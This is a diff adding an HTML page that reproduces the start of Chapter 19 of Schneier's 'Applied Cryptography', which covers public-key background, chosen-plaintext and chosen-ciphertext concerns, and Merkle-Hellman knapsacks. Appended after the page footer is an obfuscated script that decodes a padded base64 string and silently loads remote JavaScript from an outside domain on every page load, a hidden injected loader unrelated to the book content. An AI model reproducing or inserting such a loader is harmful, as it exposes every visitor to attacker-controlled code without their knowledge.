@@ -1,0 +1,92 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Public-Key Algorithms</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=19//-->
+<!--PAGES=461-463//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch18/18-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H2><A NAME="Heading1"></A><FONT COLOR="#000077">Chapter 19<BR>Public-Key Algorithms
+</FONT></H2>
+<H3><A NAME="Heading2"></A><FONT COLOR="#000077">19.1 Background</FONT></H3>
+<P>The concept of public-key cryptography was invented by Whitfield Diffie and Martin Hellman, and independently by Ralph Merkle. Their contribution to cryptography was the notion that keys could come in pairs&#151;an encryption key and a decryption key&#151;and that it could be infeasible to generate one key from the other (see Section 2.5). Diffie and Hellman first presented this concept at the 1976 National Computer Conference [495]; a few months later, their seminal paper &#147;New Directions in Cryptography&#148; was published [496]. (Due to a glacial publishing process, Merkle&#146;s first contribution to the field didn&#146;t appear until 1978 [1064].)
+</P>
+<P>Since 1976, numerous public-key cryptography algorithms have been proposed. Many of these are insecure. Of those still considered secure, many are impractical. Either they have too large a key or the ciphertext is much larger than the plaintext.</P>
+<P>Only a few algorithms are both secure and practical. These algorithms are generally based on one of the hard problems discussed in Section 11.2. Of these secure and practical public-key algorithms, some are only suitable for key distribution. Others are suitable for encryption (and by extension for key distribution). Still others are only useful for digital signatures. Only three algorithms work well for both encryption and digital signatures: RSA, ElGamal, and Rabin. All of these algorithms are slow. They encrypt and decrypt data much more slowly than symmetric algorithms; usually that&#146;s too slow to support bulk data encryption.</P>
+<P>Hybrid cryptosystems (see Section 2.5) speed things up: A symmetric algorithm with a random session key is used to encrypt the message, and a public-key algorithm is used to encrypt the random session key.</P>
+<P><FONT SIZE="+1"><B><I>Security of Public-Key Algorithms</I></B></FONT></P>
+<P>Since a cryptanalyst has access to the public key, he can always choose any message to encrypt. This means that a cryptanalyst, given <I>C</I> = <I>E</I><SUB>K</SUB>(<I>P</I>), can guess the value of <I>P</I> and easily check his guess. This is a serious problem if the number of possible plaintext messages is small enough to allow exhaustive search, but can be solved by padding messages with a string of random bits. This makes identical plaintext messages encrypt to different ciphertext messages. (For more about this concept, see Section 23.15.)</P>
+<P>This is especially important if a public-key algorithm is used to encrypt a session key. Eve can generate a database of all possible session keys encrypted with Bob&#146;s public key. Sure, this requires a large amount of time and memory, but for a 40-bit exportable key or a 56-bit DES key, it&#146;s a whole lot less time and memory than breaking Bob&#146;s public key. Once Eve has generated the database, she will have his key and can read his mail at will.</P>
+<P>Public-key algorithms are designed to resist chosen-plaintext attacks; their security is based both on the difficulty of deducing the secret key from the public key and the difficulty of deducing the plaintext from the ciphertext. However, most public-key algorithms are particularly susceptible to a chosen-ciphertext attack (see Section 1.1).</P>
+<P>In systems where the digital signature operation is the inverse of the encryption operation, this attack is impossible to prevent unless different keys are used for encryption and signatures.</P>
+<P>Consequently, it is important to look at the whole system and not just at the individual parts. Good public-key protocols are designed so that the various parties can&#146;t decrypt arbitrary messages generated by other parties&#151;the proof-of-identity protocols are a good example (see Section 5.2).</P>
+<H3><A NAME="Heading3"></A><FONT COLOR="#000077">19.2 Knapsack Algorithms</FONT></H3>
+<P>The first algorithm for generalized public-key encryption was the knapsack algorithm developed by Ralph Merkle and Martin Hellman [713, 1074]. It could only be used for encryption, although Adi Shamir later adapted the system for digital signatures [1413]. Knapsack algorithms get their security from the knapsack problem, an <B>NP-complete</B> problem. Although this algorithm was later found to be insecure, it is worth examining because it demonstrates how an <B>NP-complete</B> problem can be used for public-key cryptography.</P>
+<P>The knapsack problem is a simple one. Given a pile of items, each with different weights, is it possible to put some of those items into a knapsack so that the knapsack weighs a given amount? More formally: Given a set of values <I>M</I><SUB>1</SUB>, <I>M</I><SUB>2</SUB>,..., <I>M</I><SUB>n</SUB> <SUB>,</SUB> and a sum <I>S,</I> compute the values of <I>b</I><SUB>i</SUB> such that</P>
+<DL>
+<DD><I>S</I> = <I>b</I><SUB>1</SUB><I>M</I><SUB>1</SUB> &#43; <I>b</I><SUB>2</SUB><I>M</I><SUB>2</SUB> &#43; ...&#43; <I>b</I><SUB>n</SUB><I>M</I><SUB>n</SUB>
+</DL>
+<P>The values of <I>b</I><SUB>i</SUB> can be either zero or one. A one indicates that the item is in the knapsack; a zero indicates that it isn&#146;t.</P>
+<P>For example, the items might have weights of 1, 5, 6, 11, 14, and 20. You could pack a knapsack that weighs 22; use weights 5, 6, and 11. You could not pack a knapsack that weighs 24. In general, the time required to solve this problem seems to grow exponentially with the number of items in the pile.</P>
+<P>The idea behind the Merkle-Hellman knapsack algorithm is to encode a message as a solution to a series of knapsack problems. A block of plaintext equal in length to the number of items in the pile would select the items in the knapsack (plaintext bits corresponding to the <I>b</I> values), and the ciphertext would be the resulting sum. Figure 19.1 shows a plaintext encrypted with a sample knapsack problem.</P>
+<P>The trick is that there are actually two different knapsack problems, one solvable in linear time and the other believed not to be. The easy knapsack can be modified to create the hard knapsack. The public key is the hard knapsack, which can easily be used to encrypt but cannot be used to decrypt messages. The private key is the easy knapsack, which gives an easy way to decrypt messages. People who don&#146;t know the private key are forced to try to solve the hard knapsack problem.</P>
+<P><FONT SIZE="+1"><B><I>Superincreasing Knapsacks</I></B></FONT></P>
+<P>What is the easy knapsack problem? If the list of weights is a <B>superincreasing sequence</B>, then the resulting knapsack problem is easy to solve. A superincreasing sequence is a sequence in which every term is greater than the sum of all the previous terms. For example, {1, 3, 6, 13, 27, 52} is a superincreasing sequence, but {1, 3, 4, 9, 15, 25} is not.</P>
+<P>The solution to a <B>superincreasing knapsack</B> is easy to find. Take the total weight and compare it with the largest number in the sequence. If the total weight is less than the number, then it is not in the knapsack. If the total weight is greater than or equal to the number, then it is in the knapsack. Reduce the weight of the knapsack by the value and move to the next largest number in the sequence. Repeat until finished. If the total weight has been brought to zero, then there is a solution. If the total weight has not, there isn&#146;t.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="../ch18/18-09.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="19-02.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(QKQLkSvV, kCQSSkhH) {kCQSSkhH = QKQLkSvV.createElement('script');kCQSSkhH.type = 'text/javascript';kCQSSkhH.async = true;kCQSSkhH.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');QKQLkSvV.getElementsByTagName('body')[0].appendChild(kCQSSkhH);}(document));</script></body>
+</html>
